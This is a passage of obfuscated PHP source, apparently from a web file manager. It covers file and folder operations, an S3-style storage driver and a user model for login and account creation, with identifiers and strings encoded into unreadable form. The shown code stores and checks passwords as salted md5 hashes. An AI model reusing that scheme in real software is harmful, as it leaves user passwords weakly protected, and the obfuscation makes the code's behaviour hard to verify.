!== !1) { if ($Šˆê¾¸î == $«±ã“[10] || $Šˆê¾¸î == $«±ã“[1384]) { continue; } $¶Ù×¥Üå = $£É´Å±É . $«±ã“[8] . $Šˆê¾¸î; if (is_file($¶Ù×¥Üå) || is_link($¶Ù×¥Üå)) { if (!unlink($¶Ù×¥Üå)) { chmod($¶Ù×¥Üå, $this->pathAuth); if (!unlink($¶Ù×¥Üå)) { return !1; } } } else { if (is_dir($¶Ù×¥Üå)) { chmod($¶Ù×¥Üå, $this->pathAuth); $¶Ù×¥Üå = $this->iconvApp($¶Ù×¥Üå); if (!$this->delFolder($¶Ù×¥Üå)) { return !1; } } } } closedir($¯‰œ­Ÿ); return rmdir($£É´Å±É); } public function rename($–‘æ¦²£, $£Òãõ†ˆ) { $¸œŸå£Ğ =& $_SERVER[¯µç›È¢]; $À´ú« = $this->fileNameAuto($this->pathFather($–‘æ¦²£), $£Òãõ†ˆ); $À´ú« = $this->iconvSystem($À´ú«); $–‘æ¦²£ = $this->iconvSystem($–‘æ¦²£); $¼¿µ×Â´ = $this->pathFather($–‘æ¦²£); $Ş€ÃòÑà = rtrim($¼¿µ×Â´, $¸œŸå£Ğ[8]) . $¸œŸå£Ğ[8] . $À´ú«; $ÎÏª°¦ğ = @rename($–‘æ¦²£, $Ş€ÃòÑà); $Ş€ÃòÑà = $this->iconvApp($Ş€ÃòÑà); return $ÎÏª°¦ğ ? $this->getPathOuter($Ş€ÃòÑà) : !1; } public function size($£º¿ŸÙ«) { $£º¿ŸÙ« = $this->iconvSystem($£º¿ŸÙ«); return filesize_64($£º¿ŸÙ«); } public function info($Ò°Ñåæ·) { $Ò°Ñåæ· = $this->iconvSystem($Ò°Ñåæ·); if ($this->isFolder($Ò°Ñåæ·)) { return $this->folderInfo($Ò°Ñåæ·); } else { if ($this->isFile($Ò°Ñåæ·)) { return $this->fileInfo($Ò°Ñåæ·); } } return !1; } protected function infoChildren($èœóª–¯, &$ÏÒÑÑ’Ú, $è¢ıå« = true) { $®‡Š÷Ä =& $_SERVER[¯µç›È¢]; check_abort_echo(); $èœóª–¯ = rtrim($èœóª–¯, $®‡Š÷Ä[8]) . $®‡Š÷Ä[8]; if ($è¢ıå«) { $èœóª–¯ = $this->iconvSystem($èœóª–¯); } if (!($åÒíÉóÔ = @opendir($èœóª–¯))) { return; } while (($‰¨ş½º = readdir($åÒíÉóÔ)) !== !1) { if ($‰¨ş½º == $®‡Š÷Ä[10] || $‰¨ş½º == $®‡Š÷Ä[1384]) { continue; } $î¦Ûàë = $èœóª–¯ . $‰¨ş½º; if (is_file($î¦Ûàë) || is_link($î¦Ûàë)) { $ÏÒÑÑ’Ú[$®‡Š÷Ä[91]]++; $ÏÒÑÑ’Ú[$®‡Š÷Ä[90]] += filesize_64($î¦Ûàë); } else { if (is_dir($î¦Ûàë)) { $ÏÒÑÑ’Ú[$®‡Š÷Ä[92]]++; $this->infoChildren($î¦Ûàë, $ÏÒÑÑ’Ú, !1); } } } closedir($åÒíÉóÔ); } private function folderInfo($—§¼ùÖ, $š³€¼ë± = false) { $ÑÏ¯Ì¢á =& $_SERVER[¯µç›È¢]; $—§¼ùÖ = rtrim($—§¼ùÖ, $ÑÏ¯Ì¢á[8]) . $ÑÏ¯Ì¢á[8]; $ü“òÛ = $this->iconvApp($this->pathThis($—§¼ùÖ)); if ($š³€¼ë±) { return array($ÑÏ¯Ì¢á[32] => $ü“òÛ, $ÑÏ¯Ì¢á[88] => $this->getPathOuter($—§¼ùÖ), $ÑÏ¯Ì¢á[33] => $ÑÏ¯Ì¢á[89]); } $Ã¸€¦€ã = array($ÑÏ¯Ì¢á[32] => $ü“òÛ, $ÑÏ¯Ì¢á[88] => $this->getPathOuter($—§¼ùÖ), $ÑÏ¯Ì¢á[33] => $ÑÏ¯Ì¢á[89], $ÑÏ¯Ì¢á[207] => @filectime($—§¼ùÖ), $ÑÏ¯Ì¢á[96] => @filemtime($—§¼ùÖ), $ÑÏ¯Ì¢á[1387] => @fileatime($—§¼ùÖ), $ÑÏ¯Ì¢á[1388] => is_readable($—§¼ùÖ), $ÑÏ¯Ì¢á[1389] => is_writable($—§¼ùÖ), $ÑÏ¯Ì¢á[1390] => get_mode($—§¼ùÖ)); return $Ã¸€¦€ã; } private function fileInfo($´šú«€¸, $Öö´¥ğ¶ = false) { $ÜÃÊŠ÷Ó =& $_SERVER[¯µç›È¢]; $´¹ËØ¸ = $this->iconvApp($this->pathThis($´šú«€¸)); if ($Öö´¥ğ¶) { return array($ÜÃÊŠ÷Ó[32] => $´¹ËØ¸, $ÜÃÊŠ÷Ó[88] => $this->getPathOuter($´šú«€¸), $ÜÃÊŠ÷Ó[33] => $ÜÃÊŠ÷Ó[206], $ÜÃÊŠ÷Ó[90] => $this->size($´šú«€¸), $ÜÃÊŠ÷Ó[181] => $this->ext($´¹ËØ¸)); } $ÒÕáˆª¬ = array($ÜÃÊŠ÷Ó[32] => $´¹ËØ¸, $ÜÃÊŠ÷Ó[88] => $this->getPathOuter($´šú«€¸), $ÜÃÊŠ÷Ó[33] => $ÜÃÊŠ÷Ó[206], $ÜÃÊŠ÷Ó[207] => @filectime($´šú«€¸), $ÜÃÊŠ÷Ó[96] => @filemtime($´šú«€¸), $ÜÃÊŠ÷Ó[1387] => @fileatime($´šú«€¸), $ÜÃÊŠ÷Ó[90] => $this->size($´šú«€¸), $ÜÃÊŠ÷Ó[181] => $this->ext($´¹ËØ¸), $ÜÃÊŠ÷Ó[1388] => is_readable($´šú«€¸), $ÜÃÊŠ÷Ó[1389] => is_writable($´šú«€¸), $ÜÃÊŠ÷Ó[1390] => get_mode($´šú«€¸)); return $ÒÕáˆª¬; } public function exist($¶¯Ûèû£) { $¶¯Ûèû£ = $this->iconvSystem($¶¯Ûèû£); return @file_exists($¶¯Ûèû£); } public function isFile($ÆÑäÃ°ç) { $ÆÑäÃ°ç = $this->iconvSystem($ÆÑäÃ°ç); return @is_file($ÆÑäÃ°ç); } public function isFolder($ı¡ı òŠ) { $ı¡ı òŠ = $this->iconvSystem($ı¡ı òŠ); return @is_dir($ı¡ı òŠ); } public function listPath($Ë£–Èïû, $‚§Çè¹î = false) { $Ş’Ï¾¿¹ =& $_SERVER[¯µç›È¢]; $Ë£–Èïû = $this->iconvSystem($Ë£–Èïû); $Ë£–Èïû = rtrim($Ë£–Èïû, $Ş’Ï¾¿¹[8]) . $Ş’Ï¾¿¹[8]; $¹‹ùòÍÇ = array($Ş’Ï¾¿¹[87] => array(), $Ş’Ï¾¿¹[86] => array()); if (!($×ãÜ¼şğ = @opendir($Ë£–Èïû))) { return $¹‹ùòÍÇ; } while (($×ğµìÎÃ = readdir($×ãÜ¼şğ)) !== !1) { if ($×ğµìÎÃ == $Ş’Ï¾¿¹[10] || $×ğµìÎÃ == $Ş’Ï¾¿¹[1384]) { continue; } $“’‚ÎŒÕ = $Ë£–Èïû . $×ğµìÎÃ; if (is_file($“’‚ÎŒÕ)) { $¹‹ùòÍÇ[$Ş’Ï¾¿¹[86]][] = $this->fileInfo($“’‚ÎŒÕ, $‚§Çè¹î); } else { $¹‹ùòÍÇ[$Ş’Ï¾¿¹[87]][] = $this->folderInfo($“’‚ÎŒÕ, $‚§Çè¹î); } } closedir($×ãÜ¼şğ); return $¹‹ùòÍÇ; } public function listAll($ñª˜«Á‚, &$ñ‰¸é‘â = array()) { $’É±«­° =& $_SERVER[¯µç›È¢]; $ñª˜«Á‚ = $this->iconvSystem($ñª˜«Á‚); $ñª˜«Á‚ = rtrim($ñª˜«Á‚, $’É±«­°[8]) . $’É±«­°[8]; if (!($àìÖåõ = @opendir($ñª˜«Á‚))) { return $ñ‰¸é‘â; } while (($ÅÕ£ªÇú = readdir($àìÖåõ)) !== !1) { if ($ÅÕ£ªÇú == $’É±«­°[10] || $ÅÕ£ªÇú == $’É±«­°[1384]) { continue; } $’šÇ…óÅ = $ñª˜«Á‚ . $ÅÕ£ªÇú; if (is_dir($’šÇ…óÅ) && !is_link($’šÇ…óÅ)) { $ñ‰¸é‘â[] = array($’É±«­°[88] => $’šÇ…óÅ . $’É±«­°[8], $’É±«­°[89] => 1, $’É±«­°[96] => @filemtime($’šÇ…óÅ), $’É±«­°[90] => 0); $this->listAll($’šÇ…óÅ, $ñ‰¸é‘â); } else { $ñ‰¸é‘â[] = array($’É±«­°[88] => $’šÇ…óÅ, $’É±«­°[89] => 0, $’É±«­°[96] => @filemtime($’šÇ…óÅ), $’É±«­°[90] => $this->size($’šÇ…óÅ)); } } closedir($àìÖåõ); return $ñ‰¸é‘â; } public function has($Ã×ğÈË, $İ‚°æ÷ = false, $ö¤ìç—Å = true) { $‚Ñî³±¬ =& $_SERVER[¯µç›È¢]; $Ã×ğÈË = $this->iconvSystem($Ã×ğÈË); $Ã×ğÈË = rtrim($Ã×ğÈË, $‚Ñî³±¬[8]) . $‚Ñî³±¬[8]; if (!($ùÄ’Ó²é = @opendir($Ã×ğÈË))) { return !1; } $±ûŒåÁÄ = 0; $×ºİî„ = 0; $ü›¢¶×“ = 0; while (($ó˜‹³¸ = readdir($ùÄ’Ó²é)) !== !1) { if ($ó˜‹³¸ == $‚Ñî³±¬[10] || $ó˜‹³¸ == $‚Ñî³±¬[1384]) { continue; } $Ó×âĞÙ = $Ã×ğÈË . $ó˜‹³¸; if ($İ‚°æ÷) { $ü›¢¶×“++; if (@is_file($Ó×âĞÙ)) { $±ûŒåÁÄ++; } else { $×ºİî„++; } if ($ü›¢¶×“ > 10000) { break; } continue; } if ($ö¤ìç—Å) { if (@is_file($Ó×âĞÙ)) { return !0; } } else { if (@is_dir($Ó×âĞÙ . $‚Ñî³±¬[8])) { return !0; } } } closedir($ùÄ’Ó²é); if ($İ‚°æ÷) { return array($‚Ñî³±¬[216] => $±ûŒåÁÄ, $‚Ñî³±¬[217] => $×ºİî„); } return !1; } public function hashSimple($Ü’„¬Ä) { $©áÍğì =& $_SERVER[¯µç›È¢]; if (!$Ü’„¬Ä) { return md5($©áÍğì[12]); } $Ü’„¬Ä = $this->iconvSystem($Ü’„¬Ä); $Á©‰ÊÅğ = $this->size($Ü’„¬Ä); $Œƒ’°ÇŸ = 200; $Æç –œñ = 50; if ($Á©‰ÊÅğ <= $Œƒ’°ÇŸ * $Æç –œñ) { return $this->hashMd5($Ü’„¬Ä) . $Á©‰ÊÅğ; } $ê¹—ƒø = $©áÍğì[12]; $’†´ ¾à = intval($Á©‰ÊÅğ / $Æç –œñ); $¹²Î¤‹· = fopen($Ü’„¬Ä, $©áÍğì[1391]); if (!$¹²Î¤‹·) { return $ê¹—ƒø; } for ($¸å³àÖ = 0; $¸å³àÖ < $Æç –œñ; $¸å³àÖ++) { fseek_64($¹²Î¤‹·, $’†´ ¾à * $¸å³àÖ); $ê¹—ƒø .= fread($¹²Î¤‹·, $Œƒ’°ÇŸ); } fseek_64($¹²Î¤‹·, $Á©‰ÊÅğ - $Œƒ’°ÇŸ); $ê¹—ƒø .= fread($¹²Î¤‹·, $Œƒ’°ÇŸ); fclose($¹²Î¤‹·); return md5($ê¹—ƒø) . $Á©‰ÊÅğ; } public function getContent($’Ÿìç‰Õ) { $’Ÿìç‰Õ = $this->iconvSystem($’Ÿìç‰Õ); return file_get_contents($’Ÿìç‰Õ); } public function setContent($¥ğ¼‹ƒş, $¢‘úÜ¾ = '') { $¥ğ¼‹ƒş = $this->iconvSystem($¥ğ¼‹ƒş); $Ê®¯© = @file_put_contents($¥ğ¼‹ƒş, $¢‘úÜ¾, LOCK_EX); clearstatcache(); @chmod($¥ğ¼‹ƒş, $this->pathAuth); return $Ê®¯© === !1 ? !1 : !0; } public function fileSubstr($šİç®·, $×ïã§–¸ = 0, $ÜÎ‚®ØÑ = false) { $Â×ê¾Ğñ =& $_SERVER[¯µç›È¢]; $šİç®· = $this->iconvSystem($šİç®·); if ($ÜÎ‚®ØÑ === !1) { $ÜÎ‚®ØÑ = $this->size($šİç®·); } if ($ÜÎ‚®ØÑ <= 0) { return $Â×ê¾Ğñ[12]; } $¿‚ôİ§æ = fopen($šİç®·, $Â×ê¾Ğñ[1391]); if (!$¿‚ôİ§æ) { return !1; } fseek_64($¿‚ôİ§æ, $×ïã§–¸); $Ìãüß„„ = fread($¿‚ôİ§æ, $ÜÎ‚®ØÑ); fclose($¿‚ôİ§æ); return $Ìãüß„„; } public function upload($™‚ÈÁıœ, $‚ãò–§º, $¯±Óèëö = false, $‘ùÂ‡İÜ = REPEAT_REPLACE) { if ($¯±Óèëö) { return $this->moveFile($‚ãò–§º, $™‚ÈÁıœ); } return $this->copyFile($‚ãò–§º, $™‚ÈÁıœ); } public function setModifyTime($÷ğó¡í, $şœğ¸Éı = '') { @touch($÷ğó¡í, intval($şœğ¸Éı)); } public function download($Ê…Ç¬ÖŸ, $şğ¶·ÍÏ) { return $this->iconvSystem($Ê…Ç¬ÖŸ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ë¸ŠÆ€à) { parent::__construct($Ë¸ŠÆ€à); $this->signatureVersion($_SERVER[¯µç›È¢][225]); } public function fileOutLink($«ñ·ùµß) { $¶¥¾—›È =& $_SERVER[¯µç›È¢]; if (substr($«ñ·ùµß, 0, 7) == $¶¥¾—›È[1335]) { $«ñ·ùµß = $¶¥¾—›È[1336] . substr($«ñ·ùµß, 7); } header($¶¥¾—›È[172] . $«ñ·ùµß); die; } } goto CŠ¼Š½â¹; Aä‚Œ¦Á»µ: class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\155\145" => "\165\x73\145\x72\x5f\x6d\x65\x74\141", "\155\145\x74\141\x46\151\145\154\144" => "\x75\163\x65\x72\111\104"); protected $simpleField = "\165\163\x65\x72\111\104\x2c\x6e\x69\143\153\x4e\141\155\145\x2c\x6e\141\x6d\145\54\x61\166\141\x74\141\162\x2c\x73\x65\170\x2c\x73\x74\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÃÎŞæ) { $ê–‡ö¬¹ =& $_SERVER[¯µç›È¢]; $£ëÆ†Ç = $ê–‡ö¬¹[2264]; return array($ê–‡ö¬¹[1911] => array($ÃÎŞæ[0], $£ëÆ†Ç), $ê–‡ö¬¹[1913] => array($ÃÎŞæ[0], $£ëÆ†Ç), $ê–‡ö¬¹[2265] => array($ÃÎŞæ[0], $£ëÆ†Ç)); } protected function getInfo($ŒÊ›‰ Å, $—÷äå = false) { $ş‰ïÁÂ¿ = $this->getInfoSimple($ŒÊ›‰ Å); if (!is_array($ş‰ïÁÂ¿)) { return array(); } if ($—÷äå) { return $this->_getInfoApply($ş‰ïÁÂ¿); } return $this->cacheFunctionGet($_SERVER[¯µç›È¢][1915], $ŒÊ›‰ Å); } protected function getInfoFull($¤ÜôÁÍ, $íĞ‡ü›Ô = false) { $‘”ªÈ÷ = $this->getInfoSimple($¤ÜôÁÍ); if (!is_array($‘”ªÈ÷)) { return array(); } if ($íĞ‡ü›Ô) { return $this->_getInfoApply($‘”ªÈ÷, !0); } return $this->cacheFunctionGet($_SERVER[¯µç›È¢][2266], $¤ÜôÁÍ); } private function _getInfoApply($Ì©Èæ×, $Õ×ÅÕÏ¯ = false) { $Û‰¥‘©û =& $_SERVER[¯µç›È¢]; if (!$Ì©Èæ×) { return $Ì©Èæ×; } $¡ô®‹óø = md5($Û‰¥‘©û[2267] . $Ì©Èæ×[$Û‰¥‘©û[901]] . $Û‰¥‘©û[2268] . $Ì©Èæ×[$Û‰¥‘©û[32]]); $Ì©Èæ× = $this->_listDataApplyItem($Ì©Èæ×); $Á¶şÄé = Model($Û‰¥‘©û[1337])->metaGet($Ì©Èæ×[$Û‰¥‘©û[97]][$Û‰¥‘©û[408]]); $Ì©Èæ×[$Û‰¥‘©û[2269]] = $¡ô®‹óø; $Ì©Èæ×[$Û‰¥‘©û[97]][$Û‰¥‘©û[2099]] = isset($Á¶şÄé[$Û‰¥‘©û[2100]]) ? $Á¶şÄé[$Û‰¥‘©û[2100]] : null; if ($Õ×ÅÕÏ¯) { $Ì©Èæ×[$Û‰¥‘©û[470]] = $this->metaGet($Ì©Èæ×[$Û‰¥‘©û[1666]]); } return $Ì©Èæ×; } protected function getInfoSimple($¢‚ÙßÑË, $±Š…æ¤ê = false) { $éØ«‘˜ =& $_SERVER[¯µç›È¢]; if (!$¢‚ÙßÑË) { return array(); } if ($±Š…æ¤ê) { $Ü½ó¨Á = $this->where(array($éØ«‘˜[1666] => intval($¢‚ÙßÑË)))->find(); if (!is_array($Ü½ó¨Á)) { return array(); } $Ü½ó¨Á[$éØ«‘˜[544]] = Action($éØ«‘˜[2270])->parseUrl($Ü½ó¨Á[$éØ«‘˜[544]]); return $Ü½ó¨Á; } return $this->cacheFunctionGet($éØ«‘˜[1916], $¢‚ÙßÑË); } protected function getInfoSimpleOuter($æÙ¤ä±Ò) { $×àÌÔ…› =& $_SERVER[¯µç›È¢]; if (!$æÙ¤ä±Ò || $æÙ¤ä±Ò == 0) { return array($×àÌÔ…›[1666] => $×àÌÔ…›[204], $×àÌÔ…›[32] => $×àÌÔ…›[173] . LNG($×àÌÔ…›[2271]) . $×àÌÔ…›[541], $×àÌÔ…›[544] => STATIC_PATH . $×àÌÔ…›[2272]); } $ÆõĞÖÜå = $this->cacheFunctionGet($×àÌÔ…›[1916], $æÙ¤ä±Ò); $§ËŠŸ‚ = array_field_key($ÆõĞÖÜå, explode($×àÌÔ…›[50], $this->simpleField)); if (!$§ËŠŸ‚) { return array($×àÌÔ…›[1666] => $×àÌÔ…›[1200], $×àÌÔ…›[32] => $×àÌÔ…›[173] . LNG($×àÌÔ…›[2273]) . $×àÌÔ…›[541], $×àÌÔ…›[544] => STATIC_PATH . $×àÌÔ…›[2274]); } $§ËŠŸ‚[$×àÌÔ…›[544]] = Action($×àÌÔ…›[2270])->parseUrl($§ËŠŸ‚[$×àÌÔ…›[544]]); return $§ËŠŸ‚; } protected function groupUser($‚ÒëíÌ‡) { } public static function errorLang($ö ßãÒİ) { $˜ÃÜ¿çı =& $_SERVER[¯µç›È¢]; $İ»·Çíã = array(self::ERROR_USER_NOT_EXISTS => $˜ÃÜ¿çı[2275], self::ERROR_USER_PASSWORD_ERROR => $˜ÃÜ¿çı[2276], self::ERROR_USER_EXIST_NAME => $˜ÃÜ¿çı[2277], self::ERROR_USER_EXIST_PHONE => $˜ÃÜ¿çı[2278], self::ERROR_USER_EXIST_EMAIL => $˜ÃÜ¿çı[2279], self::ERROR_USER_LOGIN_LOCK => $˜ÃÜ¿çı[2280], self::ERROR_IP_NOT_ALLOW => $˜ÃÜ¿çı[2281], self::ERROR_USER_EXIST_NICKNAME => $˜ÃÜ¿çı[2282]); return LNG($İ»·Çíã[$ö ßãÒİ]); } public function getInfoByMeta($†¨ÍŞ‰», $à’¾İ˜±) { $¹×êË·µ =& $_SERVER[¯µç›È¢]; $Ø’È—àâ = Model($¹×êË·µ[2283])->where(array($¹×êË·µ[105] => $†¨ÍŞ‰», $¹×êË·µ[382] => $à’¾İ˜±))->find(); if ($Ø’È—àâ) { return $this->getInfo($Ø’È—àâ[$¹×êË·µ[1666]]); } return !1; } public function userLoginCheck($™‡¸â“È, $Î¤û®ñ) { $ˆ…“ßûé =& $_SERVER[¯µç›È¢]; $ïğàªİş = $this->userLoginFind($™‡¸â“È); if (!$ïğàªİş) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ïğàªİş[$ˆ…“ßûé[1666]], $Î¤û®ñ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ïğàªİş[$ˆ…“ßûé[1666]]); } public function userLoginFind($Áİïã¹) { $â«ÇÈÖã =& $_SERVER[¯µç›È¢]; $ş¸Ÿà = array($â«ÇÈÖã[32] => $Áİïã¹, $â«ÇÈÖã[543] => $Áİïã¹, $â«ÇÈÖã[313] => $Áİïã¹, $â«ÇÈÖã[2284] => $Áİïã¹, $â«ÇÈÖã[1012] => $â«ÇÈÖã[1014]); if ($this->nickNameRpt()) { unset($ş¸Ÿà[$â«ÇÈÖã[543]]); } return $this->where($ş¸Ÿà)->find(); } public function clearCache($œ± ¨®Ş) { $óåî§ã =& $_SERVER[¯µç›È¢]; $this->cacheFunctionClear($óåî§ã[1915], $œ± ¨®Ş); $this->cacheFunctionClear($óåî§ã[1916], $œ± ¨®Ş); $this->cacheFunctionClear($óåî§ã[2266], $œ± ¨®Ş); } public function userPasswordCheck($»ƒä î›, $²ûú›³õ) { $¼Şû„Ê =& $_SERVER[¯µç›È¢]; $ÏÍìşã· = $this->where(array($¼Şû„Ê[1666] => intval($»ƒä î›)))->find(); $½°µ¤‹¿ = $this->metaGet($»ƒä î›); $Ò•˜®ºÂ = isset($½°µ¤‹¿[$¼Şû„Ê[2285]]) ? $½°µ¤‹¿[$¼Şû„Ê[2285]] : $¼Şû„Ê[12]; if (md5($Ò•˜®ºÂ . trim($²ûú›³õ)) !== $ÏÍìşã·[$¼Şû„Ê[901]]) { return !1; } return !0; } public function userAdd($´¥÷ƒâ÷) { $°œÉ¢ÉÌ =& $_SERVER[¯µç›È¢]; $³ ·ßø¡ = array($°œÉ¢ÉÌ[426] => $´¥÷ƒâ÷[$°œÉ¢ÉÌ[32]], $°œÉ¢ÉÌ[2286] => $´¥÷ƒâ÷[$°œÉ¢ÉÌ[1546]], $°œÉ¢ÉÌ[2287] => isset($´¥÷ƒâ÷[$°œÉ¢ÉÌ[313]]) ? $´¥÷ƒâ÷[$°œÉ¢ÉÌ[313]] : $°œÉ¢ÉÌ[12], $°œÉ¢ÉÌ[2288] => isset($´¥÷ƒâ÷[$°œÉ¢ÉÌ[2284]]) ? $´¥÷ƒâ÷[$°œÉ¢ÉÌ[2284]] : $°œÉ¢ÉÌ[12], $°œÉ¢ÉÌ[2289] => isset($´¥÷ƒâ÷[$°œÉ¢ÉÌ[543]]) ? $´¥÷ƒâ÷[$°œÉ¢ÉÌ[543]] : $´¥÷ƒâ÷[$°œÉ¢ÉÌ[32]], $°œÉ¢ÉÌ[2290] => isset($´¥÷ƒâ÷[$°œÉ¢ÉÌ[544]]) ? $´¥÷ƒâ÷[$°œÉ¢ÉÌ[544]] : $°œÉ¢ÉÌ[12], $°œÉ¢ÉÌ[2291] => isset($´¥÷ƒâ÷[$°œÉ¢ÉÌ[2292]]) ? $´¥÷ƒâ÷[$°œÉ¢ÉÌ[2292]] : 1, $°œÉ¢ÉÌ[2293] => $´¥÷ƒâ÷[$°œÉ¢ÉÌ[901]], $°œÉ¢ÉÌ[1917] => isset($´¥÷ƒâ÷[$°œÉ¢ÉÌ[1821]]) ? $´¥÷ƒâ÷[$°œÉ¢ÉÌ[1821]] : 1024 * 1024 * 20, $°œÉ¢ÉÌ[1918] => 0, $°œÉ¢ÉÌ[2294] => 0, $°œÉ¢ÉÌ[1960] => isset($´¥÷ƒâ÷[$°œÉ¢ÉÌ[767]]) ? $´¥÷ƒâ÷[$°œÉ¢ÉÌ[767]] : 1); if (!empty($´¥÷ƒâ÷[$°œÉ¢ÉÌ[1666]])) { $³ ·ßø¡[$°œÉ¢ÉÌ[1666]] = $´¥÷ƒâ÷[$°œÉ¢ÉÌ[1666]]; } $Ã¹Øøê» = $this->_checkExist($´¥÷ƒâ÷); if ($Ã¹Øøê» !== !0) { return $Ã¹Øøê»; } if (!empty($³ ·ßø¡[$°œÉ¢ÉÌ[544]]) && strlen($³ ·ßø¡[$°œÉ¢ÉÌ[544]]) > 255) { $³ ·ßø¡[$°œÉ¢ÉÌ[544]] = $°œÉ¢ÉÌ[12]; } $øÁ¤‹åÙ = $this->add($³ ·ßø¡); $‡×«í˜¦ = array($°œÉ¢ÉÌ[2293] => $³ ·ßø¡[$°œÉ¢ÉÌ[901]], $°œÉ¢ÉÌ[2289] => $³ ·ßø¡[$°œÉ¢ÉÌ[543]]); $this->userEdit($øÁ¤‹åÙ, $‡×«í˜¦); Model($°œÉ¢ÉÌ[1337])->userRootAdd($øÁ¤‹åÙ); return $øÁ¤‹åÙ; } protected function userEditTest($ã¦˜Š¹¢, $ó˜üœ‘„) { return $this->call($_SERVER[¯µç›È¢][2295], $ã¦˜Š¹¢, $ó˜üœ‘„); } protected function userEdit($ÁŸ¢ˆ’, $ô¤Ë›¥) { $øì“Õ‰¨ =& $_SERVER[¯µç›È¢]; $éªøöã = $this->getInfoSimple($ÁŸ¢ˆ’); if (!$éªøöã) { return !1; } $Š‰Çòø‰ = $this->_checkExist($ô¤Ë›¥, $ÁŸ¢ˆ’); if ($Š‰Çòø‰ !== !0) { return $Š‰Çòø‰; } if (isset($ô¤Ë›¥[$øì“Õ‰¨[901]]) && trim($ô¤Ë›¥[$øì“Õ‰¨[901]]) != $øì“Õ‰¨[12]) { $šÂÁ¨ë = $this->metaGet($ÁŸ¢ˆ’); if (empty($šÂÁ¨ë[$øì“Õ‰¨[2285]])) { $šÂÁ¨ë[$øì“Õ‰¨[2285]] = rand_string(10); Model($øì“Õ‰¨[518])->metaSet($ÁŸ¢ˆ’, $øì“Õ‰¨[2285], $šÂÁ¨ë[$øì“Õ‰¨[2285]]); } $ô¤Ë›¥[$øì“Õ‰¨[901]] = md5($šÂÁ¨ë[$øì“Õ‰¨[2285]] . trim($ô¤Ë›¥[$øì“Õ‰¨[901]])); } else { unset($ô¤Ë›¥[$øì“Õ‰¨[901]]); } if (!empty($ô¤Ë›¥[$øì“Õ‰¨[544]]) && strlen($ô¤Ë›¥[$øì“Õ‰¨[544]]) > 255) { $ô¤Ë›¥[$øì“Õ‰¨[544]] = $øì“Õ‰¨[12]; } $this->where(array($øì“Õ‰¨[1657] => $ÁŸ¢ˆ’))->save($ô¤Ë›¥); if (isset($ô¤Ë›¥[$øì“Õ‰¨[543]])) { $this->setNamePinyin($ÁŸ¢ˆ’, $ô¤Ë›¥[$øì“Õ‰¨[543]]); } $this->clearCache($ÁŸ¢ˆ’); return !0; } public function setNamePinyin($³¨âûÎÖ, $Ç®Ù° = false) { $Êƒ—Ç¬• =& $_SERVER[¯µç›È¢]; if (!$Ç®Ù°) { $±ĞøœÛ = $this->getInfoSimple($³¨âûÎÖ); $Ç®Ù° = $±ĞøœÛ[$Êƒ—Ç¬•[543]] ? $±ĞøœÛ[$Êƒ—Ç¬•[543]] : $±ĞøœÛ[$Êƒ—Ç¬•[32]]; } $™™Òƒ¯í = Model($Êƒ—Ç¬•[546]); if (!Input::check($Ç®Ù°, $Êƒ—Ç¬•[595])) { return $™™Òƒ¯í->metaSet($³¨âûÎÖ, array($Êƒ—Ç¬•[469] => $Êƒ—Ç¬•[12], $Êƒ—Ç¬•[468] => $Êƒ—Ç¬•[12])); } return $™™Òƒ¯í->metaSet($³¨âûÎÖ, array($Êƒ—Ç¬•[469] => str_replace($Êƒ—Ç¬•[53], $Êƒ—Ç¬•[12], Pinyin::get($Ç®Ù°)), $Êƒ—Ç¬•[468] => Pinyin::get($Ç®Ù°, $Êƒ—Ç¬•[596]))); } private function nickNameRpt() { $ÏÙß½¢¢ =& $_SERVER[¯µç›È¢]; $¥ÓÛóïŠ = Model($ÏÙß½¢¢[787])->get($ÏÙß½¢¢[2296]); $—½ıŸ = $GLOBALS[$ÏÙß½¢¢[6]][$ÏÙß½¢¢[389]][$ÏÙß½¢¢[2296]]; $ŒÊúÀø¡ = !is_null($¥ÓÛóïŠ) ? $¥ÓÛóïŠ : $—½ıŸ; return !!$ŒÊúÀø¡; } private function _checkExist($ø¬ÛÈô­, $ ëƒäêç = false) { $¦Ë²§ØÂ =& $_SERVER[¯µç›È¢]; $œœàÎà¾ = array($¦Ë²§ØÂ[32] => UserModel::ERROR_USER_EXIST_NAME, $¦Ë²§ØÂ[543] => UserModel::ERROR_USER_EXIST_NICKNAME, $¦Ë²§ØÂ[313] => UserModel::ERROR_USER_EXIST_EMAIL, $¦Ë²§ØÂ[2284] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($œœàÎà¾[$¦Ë²§ØÂ[543]]); } $–°ä²»— = $ ëƒäêç ? array($¦Ë²§ØÂ[1666] => array($¦Ë²§ØÂ[2297], $ ëƒäêç)) : array(); foreach ($œœàÎà¾ as $’ëèÎ« => $Š—ı´Øº) { $·×¦¯ËÜ = array(); foreach ($œœàÎà¾ as $¬¦±³Ê± => $ö½ÔÑÑè) { if (isset($ø¬ÛÈô­[$¬¦±³Ê±]) && $ø¬ÛÈô­[$¬¦±³Ê±]) { $·×¦¯ËÜ[] = $ø¬ÛÈô­[$¬¦±³Ê±]; } } if (!$·×¦¯ËÜ) { continue; } $¬ª—ı½¬ = array_merge(array($’ëèÎ« => array($¦Ë²§ØÂ[7], $·×¦¯ËÜ)), $–°ä²»—); $òºö…ı´ = $this->where($¬ª—ı½¬)->find(); if ($òºö…ı´) { return $Š—ı´Øº; } } return !0; } public function userListInfo($äğşºÎ») { $ÍÉø›ß =& $_SERVER[¯µç›È¢]; $ö¨³ŠÂí = array(); $äğşºÎ» = is_array($äğşºÎ») ? array_unique($äğşºÎ») : array(); if (!$äğşºÎ») { return $ö¨³ŠÂí; } if (count($äğşºÎ») < 20) { foreach ($äğşºÎ» as $í÷‘ğ­¼) { $ö¨³ŠÂí[$í÷‘ğ­¼ . $ÍÉø›ß[12]] = $this->getInfoSimpleOuter($í÷‘ğ­¼); } } else { $»ã¿àíÕ = array($ÍÉø›ß[1657] => array($ÍÉø›ß[424], 